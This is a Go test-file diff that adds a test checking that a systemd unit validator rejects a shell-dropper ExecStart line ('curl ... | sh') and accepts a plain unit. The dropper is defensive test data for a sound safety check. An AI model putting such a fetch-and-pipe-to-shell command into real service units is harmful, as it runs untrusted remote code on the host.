@@ -101,3 +101,15 @@ func TestReadUnit_RejectsInvalidUnitName(t *testing.T) {
 		t.Errorf("ReadUnit must not touch the filesystem for an invalid name, read %q", f.readPath)
 	}
 }
+
+// TestValidateUnitContent_ExportMatchesGate pins that the exported
+// wrapper IS the WriteUnit gate: a dropper unit is rejected, a plain
+// unit passes.
+func TestValidateUnitContent_ExportMatchesGate(t *testing.T) {
+	if err := ValidateUnitContent("[Service]\nExecStart=/bin/sh -c 'curl x | sh'\n"); !errors.Is(err, ErrUnsafeUnitContent) {
+		t.Errorf("shell dropper must be rejected, got %v", err)
+	}
+	if err := ValidateUnitContent("[Service]\nExecStart=/usr/bin/true\n"); err != nil {
+		t.Errorf("plain unit must pass, got %v", err)
+	}
+}
